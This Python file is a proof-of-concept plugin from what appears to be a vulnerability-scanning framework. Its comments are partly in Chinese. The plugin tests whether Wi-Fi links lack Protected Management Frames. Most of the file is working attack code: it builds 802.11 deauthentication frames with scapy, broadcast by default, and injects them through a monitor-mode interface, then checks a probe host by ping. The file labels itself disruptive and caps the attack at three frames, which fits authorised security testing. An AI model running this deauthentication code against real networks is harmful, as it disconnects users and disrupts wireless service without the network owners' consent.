#!/usr/bin/env python3
"""
PoC Name: WiFi Deauthentication Attack
Identifier: CWE-345
Component: Wireless Stack
Category: Wireless
Severity: Medium
CVSS: 6.5
Description: 发送802.11 Deauth帧测试PMF保护
Prerequisites: 支持Monitor模式和包注入的无线网卡 (如 wlan0mon)，并已安装 scapy。
Usage: python3 02_CWE_345_WiFi_Deauth_Active_Validation.py <interface> [target_bssid] [client_mac]
"""
from __future__ import annotations

import sys
import subprocess
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CWE-345",
    "year":           345,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "WiFi Deauth",
    "source_url":     "https://cwe.mitre.org/data/definitions/345.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/345.html"],
    "signature_tokens": ["CWE-345"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-345 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-345") if vuln else "CWE-345",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class WiFiDeauthPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-002"
    meta_poc_name = 'CWE-345 WiFi Deauth Active Validation'
    meta_cve_id = "CWE-345"
    meta_source_url = "https://cwe.mitre.org/data/definitions/345.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/345.html']
    meta_severity = "Medium"
    meta_protocol = "wifi"
    meta_profiles = ["wifi"]
    meta_target_os = ["all"]
    meta_required_params = ["interface"]
    requires_manual_review = True
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        try:
            import scapy.all as scapy
        except ImportError:
            self.logger.error("未安装scapy工具。请执行: pip install scapy")
            return False
            
        self.interface = self.params.get("interface", "")
        self.probe_ip = self.params.get("probe_ip")
        if not self.interface:
            self.logger.error("未指定无线网卡接口 (如 wlan0mon)。请在参数中提供 interface。")
            return False
        return True

    def _ping(self, ip):
        if not ip:
            return None
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "1", ip],
                capture_output=True,
                text=True,
                timeout=3,
            )
            return result.returncode == 0
        except Exception:
            return None

    def exploit(self):
        self.logger.info(f"准备执行 Wi-Fi Deauth 攻击，使用网卡: {self.interface}")
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            target_bssid = self.params.get("target_mac", "FF:FF:FF:FF:FF:FF")
            client_mac = self.params.get("client_mac", "FF:FF:FF:FF:FF:FF")
            
            self.logger.info(f"Target BSSID: {target_bssid}")
            self.logger.info(f"Target Client Address: {client_mac}")

            # 构造 802.11 Deauth 帧
            # Reason Code 7: Class 3 frame received from nonassociated STA
            dot11 = Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            pre_ping = self._ping(self.probe_ip)
            
            self.logger.info("开始发送 Deauth 帧 (安全验证模式，仅尝试 3 次)...")
            try:
                # 持续发送，由于是在演示中，限制次数和频率
                sendp(packet, iface=self.interface, count=3, inter=0.1, verbose=False)
                self.logger.info("发送完毕。")
            except OSError as e:
                self.logger.error(f"设备发送失败，请检查网卡是否支持 Monitor 模式及注入: {str(e)}")
                return {
                    "status": "error",
                    "details": str(e)
                }
                
            post_ping = self._ping(self.probe_ip)
            if self.probe_ip and pre_ping is True and post_ping is False:
                return {
                    "status": "success",
                    "vulnerable": True,
                    "details": f"Probe host {self.probe_ip} was reachable before deauth but unreachable afterwards, indicating PMF was not protecting the link."
                }
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": "Deauth frames transmitted, but no automated post-attack connectivity loss was proven. Provide probe_ip for strict verification."
            }

        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 02_CWE_345_WiFi_Deauth_Active_Validation.py <interface> [target_bssid] [client_mac]")
        sys.exit(1)
    plugin = WiFiDeauthPlugin({"interface": sys.argv[1]})
    plugin.run_verify()
